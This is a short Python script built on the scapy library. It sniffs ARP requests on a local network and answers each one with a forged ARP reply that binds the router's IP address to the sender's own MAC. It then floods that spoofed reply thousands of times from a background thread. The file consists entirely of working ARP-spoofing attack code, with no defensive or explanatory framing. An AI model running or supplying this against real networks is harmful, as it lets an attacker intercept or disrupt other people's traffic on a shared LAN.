from scapy.all import *
import threading

routerIp = "192.168.1.1" # IP address of the router
routerMac = "5c:e0:c5:d6:45:5c" # MAC of your PC

def SendContinuosly(packet):
    for i in range(5000):
        sendp(packet, verbose=0)
        print(f"sent {i + 1} packet(s)")
        time.sleep(0.1)

def HandlePacket(pkt):
    etherPkt = Ether(dst=pkt[ARP].hwsrc, src=routerMac)
    spoofedReply = ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc, psrc=routerIp, hwsrc=routerMac)
    finalPacket = etherPkt/spoofedReply
    sendp(finalPacket, verbose=0)
    t = threading.Thread(target=lambda: SendContinuosly(finalPacket))
    t.start()

def IsARPQuery(pkt):
    if pkt[ARP].op == 1:
        print("received a query")
    else:
        print("sniffed an ARP response")
    return pkt.haslayer(ARP) and pkt[ARP].op == 1

sniff(filter="arp", prn=lambda x: HandlePacket(x) if IsARPQuery(x) else None)
